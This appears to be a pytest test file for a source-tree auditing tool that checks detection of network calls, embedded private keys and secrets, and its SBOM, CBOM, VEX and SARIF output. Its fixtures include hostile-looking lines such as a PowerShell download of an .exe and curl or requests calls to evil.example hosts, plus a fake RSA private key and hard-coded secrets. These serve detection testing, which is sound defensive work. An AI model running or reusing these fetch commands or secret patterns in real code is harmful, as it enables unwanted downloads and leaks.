"""Every byte that decides a result is read the way the program that uses it reads it, and what is not read is named.
Each test asserts both halves: the false thing is gone, the true neighbour stays."""
from __future__ import annotations

import ast
import json
import struct
import subprocess
import sys
from dataclasses import asdict
from pathlib import Path

import pytest

from entrovouch import cbom, key_provenance, sbom
from entrovouch.no_egress_auditor import audit
from entrovouch.sarif import to_sarif

REPO = Path(__file__).resolve().parents[1]
PEM = ("-----BEGIN RSA PRIVATE KEY-----\n" + "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n" * 4
       + "-----END RSA PRIVATE KEY-----\n")


def _write(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


def _put(root: Path, rel: str, data: bytes) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return p


def _cli(module: str, *args):
    return subprocess.run([sys.executable, "-W", "ignore", "-m", f"entrovouch.{module}", *map(str, args)],
                          cwd=REPO, capture_output=True, text=True, encoding="utf-8")


def _kp(root: Path):
    return key_provenance.scan_key_provenance(root, label="t")


# ---------------------------------------------------------------- what a skipped directory holds is not the tree
def test_the_findings_digest_does_not_depend_on_what_skipped_directories_hold(tmp_path):
    for name, extra in (("a", 26), ("b", 28)):
        _write(tmp_path / name, "main.py", "import requests\nrequests.get('https://example.org')\n")
        for k in range(extra):
            _write(tmp_path / name, f".git/objects/{k:02d}", "x")
    _write(tmp_path / "b", ".hypothesis/examples/one", "y")
    _write(tmp_path / "b", "node_modules/left-pad/index.js", "module.exports = 1\n")
    a, b = audit(tmp_path / "a", label="org/repo@c"), audit(tmp_path / "b", label="org/repo@c")
    assert a.findings_digest == b.findings_digest and a.subject_digest == b.subject_digest
    # the report still says what was skipped
    assert a.not_scanned["skipped_directories"] == {".git/": 26}
    assert b.not_scanned["skipped_directories"] == {".git/": 28, ".hypothesis/": 1, "node_modules/": 1}
    # and a change in what WAS read still changes the digest
    _write(tmp_path / "b", "main.py", "import requests\nrequests.get('https://example.org/other')\n")
    assert audit(tmp_path / "b", label="org/repo@c").findings_digest != a.findings_digest


# ---------------------------------------------------------------- text in the encoding its program reads
@pytest.mark.parametrize("encoding", ["utf-16", "utf-16-be-bom", "utf-32", "utf-8-sig"])
def test_a_script_in_any_unicode_encoding_is_read(tmp_path, encoding):
    text = "Invoke-WebRequest -Uri https://evil.example.com/x -OutFile x.exe\r\nWrite-Host done\r\n"
    data = b"\xfe\xff" + text.encode("utf-16-be") if encoding == "utf-16-be-bom" else text.encode(encoding)
    _put(tmp_path, "get.ps1", data)
    rep = audit(tmp_path, label="t")
    assert [(f["line"], f["kind"]) for f in rep.findings] == [(1, "script-network-command")]


def test_a_utf16_requirements_file_is_read_as_pip_reads_it(tmp_path):
    _put(tmp_path, "requirements.txt", "requests==2.0\nclick\n".encode("utf-16"))
    comps = {c["name"]: c["purl"] for c in asdict(sbom.build_sbom(tmp_path, label="t"))["components"]}
    assert comps == {"requests": "pkg:pypi/requests@2.0", "click": "pkg:pypi/click"}
    assert [f["kind"] for f in audit(tmp_path, label="t").findings] == ["declared-network-dependency"]


def test_a_manifest_that_is_not_text_names_no_package(tmp_path):
    _put(tmp_path, "requirements.txt", b"req\x01uests==2.0\nfl\x00ask\nclick\n")
    names = [c["name"] for c in asdict(sbom.build_sbom(tmp_path, label="t"))["components"]]
    assert names == ["click"]


# ---------------------------------------------------------------- key material wherever it is, or named as not read
def test_private_key_armour_is_found_in_a_large_or_utf16_text_file(tmp_path):
    _write(tmp_path / "big", "deploy.txt", PEM + "x" * 1_100_000)
    _put(tmp_path / "u16", "deploy.txt", PEM.encode("utf-16"))
    for sub in ("big", "u16"):
        rep = _kp(tmp_path / sub)
        assert [(f["file"], f["kind"]) for f in rep.findings] == [("deploy.txt", "key-file-in-tree")], sub


def test_what_key_provenance_did_not_read_is_listed(tmp_path, monkeypatch):
    monkeypatch.setattr(key_provenance, "_KEY_MAX_BYTES", 64)
    _write(tmp_path, "main.py", "x = 1\n")
    _write(tmp_path, "notes.txt", "y" * 100)                    # over the (lowered) limit: listed
    _write(tmp_path, "server.key", PEM)                         # over the limit, a key file by name: still reported
    _put(tmp_path, "logo.png", b"\x89PNG\r\n\x1a\n\x00\x00")    # binary: searched like any other file
    _write(tmp_path, "build/deploy.pem", PEM)                   # in a skipped directory: listed
    rep = _kp(tmp_path)
    assert [(f["file"], f["detail"]) for f in rep.findings] == [
        ("server.key", "a file named like key material is in the tree (too large to read)")]
    assert rep.not_scanned == {"skipped_directories": {"build/": 1}, "too_large": ["notes.txt"],
                               "archives_not_opened": [], "archives_not_fully_read": [], "symbolic_links": 0}
    md = key_provenance.render_markdown(rep)
    assert "Skipped directories (not read)" in md and "Files too large to read (1)" in md


def test_key_provenance_survives_deeply_nested_generated_code(tmp_path):
    src = "x = " + "+".join(['"a"'] * 3000) + "\nSIGNING_KEY = 'q8vK2mN4pR7sT1w9'\n"
    _write(tmp_path, "g.py", src)
    rep = _kp(tmp_path)                                    # never a crash
    try:
        ast.parse(src)
        parses = True
    except RecursionError:
        parses = False                                     # this interpreter cannot parse it either (3.11 on Windows)
    if parses:
        assert [f["line"] for f in rep.findings] == [2] and rep.verdict == "REVIEW"
    else:
        assert [f["file"] for f in rep.files_not_parsed] == ["g.py"] and rep.verdict == "REVIEW"


def test_the_common_ways_a_secret_is_bound_are_read(tmp_path):
    _write(tmp_path, "app.py", "\n".join([
        "app.config['SECRET_KEY'] = 'q8Zr2LmP0vXk7TnB4wYsA1c'",
        "app.secret_key = 'q8Zr2LmP0vXk7TnB4wYsA1c'",
        "SECRET_KEY, X = 'q8Zr2LmP0vXk7TnB4wYsA1c', 1",
        "if (api_token := 'q8Zr2LmP0vXk7TnB4wYsA1c'):",
        "    pass",
        "setattr(app, 'secret_key', 'q8Zr2LmP0vXk7TnB4wYsA1c')",
        "sign = lambda m, secret_key='q8Zr2LmP0vXk7TnB4wYsA1c': m",
        "app.config['SECRET_KEY'] = ''",
        "app.config['CONTENT_TYPE_KEY'] = 'Content-Type'",
        "conf['producer.key'] = 'sasl.oauthbearer.method'",
        "headers['Authorization'] = 'Bearer'",
        "app.config['SECRET_KEY'] = os.environ['SECRET_KEY']",
        "item.attrib['password'] = '********'",
        "oidc.token_endpoint = 'https://myidp.example.com/oauth2/v1/token'",
        "mock.public_key = 'q8Zr2LmP0vXk7TnB4wYsA1c'",
    ]) + "\n")
    assert sorted(f["line"] for f in _kp(tmp_path).findings) == [1, 2, 3, 4, 6, 7]


# ---------------------------------------------------------------- notebook magics that run Python, and ones that do not
def _nb(root: Path, *cells: list[str]) -> None:
    _write(root, "n.ipynb", json.dumps({"nbformat": 4, "cells": [{"cell_type": "code", "source": c} for c in cells]}))


def test_debug_aimport_load_ext_and_run_m_are_read(tmp_path):
    _nb(tmp_path,
        ["%debug import requests; requests.get('https://evil.example.com')\n"],
        ["%aimport ftplib, -foo\n"],
        ["%load_ext autoreload\n", "%run -m smtplib\n", "%run setup.py\n", "%matplotlib inline\n"],
        ["%debug --breakpoint m.py:3 import socket\n"])
    rep = audit(tmp_path, label="t")
    assert sorted({(f["line"], f["kind"]) for f in rep.findings}) == [
        (1, "network-call"), (1, "network-import"), (2, "network-import"), (3, "network-import"),
        (4, "network-import")]
    assert rep.unlisted_imports == []          # autoreload is IPython's own; setup.py is a file, not an import


def test_cbom_and_key_provenance_read_a_debug_cell_and_skip_only_programs_and_markup(tmp_path):
    _nb(tmp_path,
        ["%%debug\n", "import hashlib; hashlib.md5(b'x')\n", "SECRET_KEY = 'Zq8vB3nM1xL0pR7tA'\n"],
        ["%debug import hashlib; hashlib.sha1(b'x')\n"],
        ["%%bash\n", "openssl md5 x\n"],
        ["%%html\n", "<div>SECRET_KEY = 'Zq8vB3nM1xL0pR7tA'</div>\n"])
    assert [c["line"] for c in asdict(cbom.build_cbom(tmp_path, label="t"))["components"]] == [1, 2]
    assert [f["line"] for f in _kp(tmp_path).findings] == [1]


def test_percent_and_bang_inside_brackets_are_python_not_magics(tmp_path):
    _nb(tmp_path,
        ["changed = (\n", "    cached\n", "    != requests.get('https://api.example.com/s').status_code\n", ")\n"],
        ["x = (\n", "    2\n", "    % len(__import__('socket').getaddrinfo('evil.example.com', 443))\n", ")\n"],
        ["s = '''\n", "!curl https://x.example\n", "'''\n"],
        ["!curl https://evil.example.com/a\n"])
    found = sorted((f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings)
    assert found == [(1, "unresolved-call"), (2, "dynamic-exec"), (4, "subprocess-shell")]


# ---------------------------------------------------------------- links: the same answer on every system
def _git_index(entries: list[tuple[str, int]]) -> bytes:
    """A version-2 git index naming `entries` (path, mode)."""
    out = [b"DIRC", struct.pack(">II", 2, len(entries))]
    for name, mode in sorted(entries):
        raw = name.encode("utf-8")
        entry = struct.pack(">10I", 0, 0, 0, 0, 0, 0, mode, 0, 0, 0) + b"\x00" * 20 + struct.pack(">H", len(raw)) + raw
        entry += b"\x00" * (8 - (len(entry) % 8))
        out.append(entry)
    return b"".join(out) + b"\x00" * 20


def test_a_git_index_cannot_hide_a_file(tmp_path):
    # The index is the tree author's to write: one that marks a real file as a link (mode 120000) hides nothing
    _write(tmp_path, "evil.py", "import requests\nrequests.get('https://evil.example/x')\n")
    _write(tmp_path, "cfg.py", "import urllib.request\nurllib.request.urlopen('https://evil.example/')\n")
    _put(tmp_path, ".git/index", _git_index([("cfg.py", 0o120000), ("evil.py", 0o120000)]))
    rep = audit(tmp_path, label="t")
    assert rep.not_scanned["symbolic_links"] == 0
    assert {f["file"] for f in rep.findings} == {"evil.py", "cfg.py"} and rep.verdict == "FINDINGS"
    assert audit(tmp_path, label="t").findings_digest == rep.findings_digest
    # without the index the same tree gives the same report
    (tmp_path / ".git" / "index").rename(tmp_path / "moved-index")
    (tmp_path / "moved-index").rename(tmp_path / ".git" / "index.bak")
    assert audit(tmp_path, label="t").findings_digest == rep.findings_digest


# ---------------------------------------------------------------- joined and converted reports say what they cover
def test_vex_refuses_key_provenance_from_a_tree_whose_other_files_differ(tmp_path):
    for name, secret in (("a", "q8Zr2LmP0vXk7TnB4wYsA1"), ("b", "changeme")):
        _write(tmp_path / name, "main.py", "import hashlib\nhashlib.md5(b'x')\n")
        _write(tmp_path / name, ".env", f"SECRET_KEY={secret}\n")
    (tmp_path / "c.json").write_text(json.dumps(asdict(cbom.build_cbom(tmp_path / "a", label="s"))), encoding="utf-8")
    for name in ("a", "b"):
        (tmp_path / f"k{name}.json").write_text(json.dumps(_kp_json(tmp_path / name)), encoding="utf-8")
    assert _cli("vex", tmp_path / "c.json", "--key-provenance", tmp_path / "ka.json", "--out",
                tmp_path / "ok.json").returncode == 0
    r = _cli("vex", tmp_path / "c.json", "--key-provenance", tmp_path / "kb.json", "--out", tmp_path / "no.json")
    assert r.returncode == 2 and "not made from the same files" in r.stderr


def _kp_json(root: Path) -> dict:
    return key_provenance.scan_key_provenance(root, label="s").__dict__


def test_vex_and_csaf_refuse_a_cbom_that_read_nothing_and_carry_what_one_could_not_parse(tmp_path):
    _write(tmp_path / "empty", "notes.rst", "readme\n")
    _write(tmp_path / "broken", "m.py", "import hashlib\nhashlib.md5(b'x'\n")
    for name in ("empty", "broken"):
        (tmp_path / f"{name}.json").write_text(json.dumps(asdict(cbom.build_cbom(tmp_path / name, label="t"))),
                                               encoding="utf-8")
    for module, extra in (("vex", []), ("csaf", ["--publisher-name", "X", "--publisher-namespace", "https://x.example"])):
        r = _cli(module, tmp_path / "empty.json", "--out", tmp_path / f"{module}-e.json", *extra)
        assert r.returncode == 2 and "read nothing" in r.stderr and not (tmp_path / f"{module}-e.json").exists()
    r = _cli("vex", tmp_path / "broken.json", "--out", tmp_path / "vex-b.json")
    assert r.returncode == 0 and "m.py" in r.stderr
    props = {p["name"]: p["value"] for p in
             json.loads((tmp_path / "vex-b.json").read_text(encoding="utf-8"))["metadata"]["properties"]}
    assert props["entrovouch:verdict"] == "REVIEW-NEEDED" and "m.py" in props["entrovouch:filesNotParsed"]


def test_sarif_from_an_audit_that_read_nothing_is_an_unsuccessful_run(tmp_path):
    _write(tmp_path / "empty", "notes.rst", "readme\n")
    _write(tmp_path / "full", "a.py", "import requests\n")
    empty = to_sarif(asdict(audit(tmp_path / "empty", label="t")))["runs"][0]["invocations"][0]
    full = to_sarif(asdict(audit(tmp_path / "full", label="t")))["runs"][0]["invocations"][0]
    assert empty["executionSuccessful"] is False and empty["toolExecutionNotifications"][0]["level"] == "error"
    assert full == {"executionSuccessful": True}


# ---------------------------------------------------------------- scripts: escaped joins, PowerShell installers
def test_an_escaped_join_starts_no_command(tmp_path):
    _put(tmp_path, "run.bat", b"echo Install with ^& curl https://x.example.com/ later\r\n"
                              b"cmd1 & curl https://x.example.com/c\r\n")
    _write(tmp_path / "sh", "a.sh", "echo use \\& curl https://x.example.com/b\nmake & wget https://x.example.com/e\n")
    assert [(f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings
            if f["file"] == "run.bat"] == [(1, "script-network-word"), (2, "script-network-command")]
    assert [(f["line"], f["kind"]) for f in audit(tmp_path / "sh", label="t").findings] == [
        (1, "script-network-word"), (2, "script-network-command")]


def test_powershell_installers_reach_the_network(tmp_path):
    _write(tmp_path, "s.ps1", "Install-Module PSReadLine -Force\nSave-Module Foo -Path .\nUpdate-Module Bar\n"
                              "Write-Host \"Install-Module later\"\n")
    assert [(f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings] == [
        (1, "script-network-command"), (2, "script-network-command"), (3, "script-network-command")]


def test_an_address_in_inline_python_the_python_check_cannot_judge_is_still_reported(tmp_path):
    _write(tmp_path, "a.sh", "python -c \"import tableauserverclient as TSC; TSC.Server('http://example.com')\"\n")
    assert [f["kind"] for f in audit(tmp_path, label="t").findings] == ["external-url"]
